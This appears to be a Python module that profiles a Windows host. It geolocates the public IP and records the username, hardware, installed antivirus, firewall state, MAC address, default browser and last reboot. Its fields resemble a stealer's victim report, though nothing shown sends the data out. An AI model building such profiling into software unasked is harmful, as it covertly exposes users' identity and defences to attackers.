import os
import sys
import subprocess
import ctypes
import locale
import platform
import uuid
from datetime import datetime


def get_sys_info():
    info = {}
    
    info["IP"] = "Unknown"
    info["Location"] = "Unknown"
    try:
        import urllib.request, json
        req = urllib.request.Request("http://ip-api.com/json", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode())
            info["IP"] = data.get("query", "Unknown")
            info["Location"] = f"{data.get('city', 'Unknown')}, {data.get('regionName', 'Unknown')}, {data.get('country', 'Unknown')}"
    except Exception:
        pass
    
    info["UserName"] = os.getlogin()
    info["PCName"] = platform.node()
    info["OS"] = f"Microsoft {platform.system()} {platform.release()} {platform.machine()}"
    info["Platform"] = f"Win{platform.release()}" if platform.system() == "Windows" else platform.system()
    info["Ver"] = platform.version()
    
    info["Client"] = os.path.abspath(__file__)
    info["Process"] = os.path.basename(sys.executable)
    info["DateTime"] = datetime.now().strftime("%Y.%m.%d %H:%M:%S")
    
    info["GPU"] = "Unknown"
    info["CPU"] = platform.processor()
    try:
        gpu_req = subprocess.check_output("wmic path win32_VideoController get name", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
        if gpu_req: info["GPU"] = gpu_req
        cpu_req = subprocess.check_output("wmic cpu get name", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
        if cpu_req: info["CPU"] = cpu_req
    except: pass
        
    info["Identifier"] = platform.processor()
    
    info["Ram"] = "Unknown"
    try:
        total_ram = int(subprocess.check_output("wmic computersystem get TotalPhysicalMemory", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip())
        info["Ram"] = f"{total_ram / (1024**3):.2f} GB"
    except: pass
        
    info["LastReboot"] = "Unknown"
    try:
        boot_str = subprocess.check_output("wmic os get lastbootuptime", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip().split('.')[0]
        boot_time = datetime.strptime(boot_str, "%Y%m%d%H%M%S")
        hours_ago = int((datetime.now() - boot_time).total_seconds() / 3600)
        info["LastReboot"] = f"{hours_ago} hour(s) ago"
    except: pass
        
    info["Antivirus"] = "Unknown"
    try:
        av = subprocess.check_output("powershell \"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName\"", shell=True, stderr=subprocess.DEVNULL).decode().strip().split('\n')[0].strip()
        info["Antivirus"] = av if av else "Windows Defender"
    except: pass
        
    info["Firewall"] = "Unknown"
    try:
        fw = subprocess.check_output("netsh advfirewall show allprofiles state", shell=True, stderr=subprocess.DEVNULL).decode()
        info["Firewall"] = "Enabled" if "ON" in fw.upper() or "AÇIK" in fw.upper() else "Disabled"
    except: pass
        
    info["MacAddress"] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]).upper()
    
    info["DefaultBrowser"] = "Unknown"
    try:
        b_id = subprocess.check_output("reg query \"HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\" /v ProgId", shell=True, stderr=subprocess.DEVNULL).decode()
        for b in ["Chrome", "Firefox", "Edge", "Opera", "Brave"]:
            if b.lower() in b_id.lower():
                info["DefaultBrowser"] = b
                break
    except: pass
        
    info["CurrentLang"] = "Unknown"
    try:
        info["CurrentLang"] = locale.getlocale()[0].split('_')[0].upper()
    except: pass
        
    info[".Net"] = "Unknown"
    try:
        net_v = subprocess.check_output("reg query \"HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" /v Release", shell=True, stderr=subprocess.DEVNULL).decode()
        info[".Net"] = "v4.0+" if "Release" in net_v else "v4.0"
    except: pass
        
    info["Battery"] = "Unknown"
    class SYSTEM_POWER_STATUS(ctypes.Structure):
        _fields_ = [('AC', ctypes.c_byte), ('BatFlag', ctypes.c_byte), ('BatLife', ctypes.c_byte), ('SysStat', ctypes.c_byte), ('BatLifeTime', ctypes.c_ulong), ('BatFullLifeTime', ctypes.c_ulong)]
    p_stat = SYSTEM_POWER_STATUS()
    if ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(p_stat)):
        info["Battery"] = "No Battery (Desktop)" if p_stat.BatFlag == 128 else f"{p_stat.BatLife}%"

    return info
